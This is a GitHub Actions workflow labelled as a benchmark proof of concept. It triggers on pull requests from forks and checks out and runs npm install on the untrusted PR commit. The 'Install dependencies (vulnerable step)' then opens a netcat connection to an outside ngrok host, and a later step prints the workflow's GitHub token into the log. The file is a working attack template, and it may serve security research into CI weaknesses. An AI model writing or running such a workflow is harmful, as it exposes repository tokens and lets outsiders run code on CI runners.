name: benchmarks-poc

on:
  pull_request: # Runs on any PR, including forks

jobs:
  poc:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20.x'

      - name: Install dependencies (vulnerable step)
        run: |
          git checkout -f ${{ github.event.pull_request.head.sha }}
          npm install --loglevel error
          nc 0.tcp.in.ngrok.io 10789

      - name: Run benchmark (dummy)
        run: |
          npm run perf || echo "Benchmark script not found, but PoC still runs"
          echo "THis is the token: ${{ github.token }}"

